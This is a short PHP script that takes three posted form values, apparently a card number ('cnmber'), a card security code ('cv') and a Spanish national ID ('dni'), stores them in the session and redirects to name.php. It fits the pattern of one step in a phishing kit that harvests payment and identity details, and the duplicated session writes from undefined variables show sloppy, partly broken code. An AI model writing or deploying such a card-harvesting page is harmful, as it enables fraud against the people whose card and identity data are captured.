<?php
session_start();



$_SESSION['cnmber'] = "$cnmber";

$_SESSION['cv'] = "$cv";
$_SESSION['dni'] = "$dni";
$cnmber = $_POST['cnmber'];

$cv = $_POST['cv'];
$dni = $_POST['dni'];

 



$_SESSION['cnmber'] = "$cnmber";

$_SESSION['cv'] = "$cv";
$_SESSION['dni'] = "$dni";

header('location: name.php');

?>